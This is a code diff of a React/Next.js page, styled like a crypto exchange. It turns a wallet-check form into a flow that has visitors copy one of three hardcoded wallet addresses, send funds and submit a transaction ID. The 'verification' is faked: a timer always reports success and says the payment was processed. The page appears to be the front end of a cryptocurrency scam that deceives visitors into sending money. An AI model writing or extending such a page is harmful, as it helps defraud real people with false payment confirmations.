@@ -1,16 +1,60 @@
 "use client";
 
-import { useState } from "react";
-import { FaBars, FaTimes } from "react-icons/fa";
+import { useState, useEffect } from "react";
+import {
+  FaBars,
+  FaTimes,
+  FaWallet,
+  FaCoins,
+  FaExchangeAlt,
+  FaCheck,
+} from "react-icons/fa";
 
 export default function Home() {
+  const [currentStep, setCurrentStep] = useState(1);
   const [email, setEmail] = useState("");
+  const [txId, setTxId] = useState("");
   const [isMenuOpen, setIsMenuOpen] = useState(false);
-
-  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) =>
-    setEmail(e.target.value);
-
+  const [showCopiedDialog, setShowCopiedDialog] = useState(false);
+  const [showTxDialog, setShowTxDialog] = useState(false);
   const toggleMenu = () => setIsMenuOpen(!isMenuOpen);
+
+  const wallets = [
+    {
+      name: "MetaMask",
+      icon: <FaWallet className="text-2xl" />,
+      address: "0x4D3d5CA8bB3C9f4EdE2C5E20F2D3dF3bB3C9f4Ed",
+    },
+    {
+      name: "Trust Wallet",
+      icon: <FaCoins className="text-2xl" />,
+      address: "0x9A8E7fE2E4D3d5CA8bB3C9f4EdE2C5E20F2D3dF3",
+    },
+    {
+      name: "Binance Chain",
+      icon: <FaExchangeAlt className="text-2xl" />,
+      address: "bnb1tq9d4p357d4p357d4p357d4p357d4p357d9qk",
+    },
+  ];
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    setCurrentStep(2);
+  };
+
+  const copyToClipboard = (address: string) => {
+    navigator.clipboard.writeText(address);
+    setShowCopiedDialog(true);
+    setTimeout(() => setShowCopiedDialog(false), 2000);
+  };
+
+  const handleCheckTx = () => {
+    setShowTxDialog(true);
+    setTimeout(() => {
+      setShowTxDialog(false);
+      setCurrentStep(4);
+    }, 2000);
+  };
 
   return (
     <div className="bg-[#181a20] min-h-screen flex flex-col">
@@ -92,7 +136,6 @@ export default function Home() {
           </button>
         </div>
       </header>
-
       {/* Mobile Menu */}
       <div
         className={`sm:hidden fixed inset-0 bg-[#181a20] bg-opacity-90 transition-all ${
@@ -123,30 +166,141 @@ export default function Home() {
 
       {/* Main Content */}
       <div className="flex items-center justify-center min-h-screen pt-20 p-8">
-        <div className="w-full max-w-md p-8 rounded-xl transition-all duration-1000">
-          <h2 className="text-2xl text-white font-semibold mb-10 text-left">
-            Check Wallet Address
-          </h2>
-          <h5 className="text-sm text-white mb-1 text-left">
-            Add Wallet Address
-          </h5>
-          <form className="flex flex-col items-center gap-4">
-            <input
-              value={email}
-              onChange={handleEmailChange}
-              placeholder=""
-              required
-              className="w-full p-3 rounded-md text-white border-[1px] border-[#666] border-solid bg-[#181a20] focus:outline-none hover:ring-[1px] hover:ring-[#f0b90b]"
-            />
-            <button
-              type="submit"
-              className="w-full bg-[#f2c118] text-lg text-black p-3 rounded-lg transition-colors hover:bg-[#d1a10f]"
-            >
-              Next
-            </button>
-          </form>
+        <div className="w-full max-w-md p-8 rounded-xl bg-[#181a20] shadow-xl transition-all duration-300 transform">
+          {currentStep === 1 && (
+            <div className="animate-slide-up">
+              <h2 className="text-2xl text-white font-semibold mb-6">
+                Welcome!
+              </h2>
+              <form onSubmit={handleSubmit} className="flex flex-col gap-4">
+                <div>
+                  <h5 className="text-md text-white mb-2">
+                    1 - Go to next step!
+                  </h5>
+                  <h5 className="text-md text-white mb-2">
+                    2 - Choose a wallet address and do transaction
+                  </h5>
+                  <h5 className="text-md text-white mb-2">
+                    3 - write your txId in form and check it
+                  </h5>
+                  <h5 className="text-md text-white mb-2">
+                    4 - everything is good now!
+                  </h5>
+                </div>
+                <button
+                  type="submit"
+                  className="w-full bg-[#f2c118] text-black p-3 rounded-lg hover:bg-[#d1a10f] transition-colors"
+                >
+                  Next
+                </button>
+              </form>
+            </div>
+          )}
+
+          {currentStep === 2 && (
+            <div className="animate-slide-up">
+              <h2 className="text-2xl text-white font-semibold mb-6">
+                Select Wallet
+              </h2>
+              <div className="space-y-4">
+                {wallets.map((wallet) => (
+                  <div
+                    key={wallet.name}
+                    onClick={() => copyToClipboard(wallet.address)}
+                    className="flex items-center p-4 rounded-lg bg-[#2b2f36] hover:bg-[#3d424a] cursor-pointer transition-colors"
+                  >
+                    <span className="text-[#f2c118] mr-3">{wallet.icon}</span>
+                    <div className="text-white">
+                      <div className="font-medium">{wallet.name}</div>
+                      <div className="text-sm text-gray-400">
+                        {wallet.address}
+                      </div>
+                    </div>
+                  </div>
+                ))}
+                <button
+                  onClick={() => setCurrentStep(3)}
+                  className="w-full bg-[#f2c118] text-black p-3 rounded-lg hover:bg-[#d1a10f] transition-colors mt-6"
+                >
+                  Next
+                </button>
+              </div>
+            </div>
+          )}
+
+          {currentStep === 3 && (
+            <div className="animate-slide-up">
+              <h2 className="text-2xl text-white font-semibold mb-6">
+                Verify Transaction
+              </h2>
+              <div className="space-y-6">
+                <div>
+                  <h5 className="text-sm text-white mb-2">Transaction ID</h5>
+                  <input
+                    type="text"
+                    value={txId}
+                    onChange={(e) => setTxId(e.target.value)}
+                    className="w-full p-3 rounded-md text-white border border-[#666] bg-[#181a20] focus:outline-none focus:ring-1 focus:ring-[#f2c118]"
+                    placeholder="Enter your transaction ID"
+                    required
+                  />
+                </div>
+                <button
+                  onClick={handleCheckTx}
+                  className="w-full bg-[#f2c118] text-black p-3 rounded-lg hover:bg-[#d1a10f] transition-colors"
+                >
+                  Verify
+                </button>
+              </div>
+            </div>
+          )}
+
+          {currentStep === 4 && (
+            <div className="animate-slide-up text-center">
+              <h2 className="text-2xl text-white font-semibold mb-4">
+                Thank You!
+              </h2>
+              <p className="text-gray-300">
+                Your transaction has been processed successfully. We'll contact
+                you shortly.
+              </p>
+              <div className="mt-8 text-[#f2c118] flex justify-center">
+                <FaCheck className="text-4xl animate-bounce" />
+              </div>
+            </div>
+          )}
         </div>
       </div>
+
+      {/* Dialogs */}
+      {showCopiedDialog && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-[#2b2f36] p-6 rounded-lg text-white animate-pop-in">
+            <p>✓ Address copied to clipboard!</p>
+          </div>
+        </div>
+      )}
+
+      {showTxDialog && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-[#2b2f36] p-6 rounded-lg text-white animate-pop-in">
+            <p>✓ Transaction verified successfully!</p>
+          </div>
+        </div>
+      )}
+
+      {/* <div className=""
+        style={{
+          width: "60px",
+          height: "60px",
+          background: "#f2c118",
+          position: "absolute",
+          right: "10px",
+          bottom: "10px",
+        }}
+      >
+        asdasd
+      </div> */}
     </div>
   );
 }
